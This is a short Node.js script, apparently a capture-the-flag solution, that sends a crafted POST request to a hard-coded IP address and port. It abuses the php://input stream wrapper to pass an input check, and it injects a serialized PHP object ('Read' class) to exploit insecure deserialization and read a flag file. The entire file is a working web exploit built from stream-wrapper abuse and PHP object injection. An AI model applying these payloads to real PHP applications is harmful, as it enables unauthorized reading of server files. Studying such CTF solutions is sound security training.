const got = require('got')

const HOST = 'http://120.55.43.255:28119/'

const read = async () => {
  let response = await got.post(`${HOST}/`, {
    searchParams: {
      user: 'php://input',
      file: 'class.php',
      pass: 'O:4:"Read":1:{s:4:"file";s:13:"fffffflag.php";}',
    },
    body: 'admin',
  })
  return response.body
}

;(async () => {
  console.log(await read())
})()
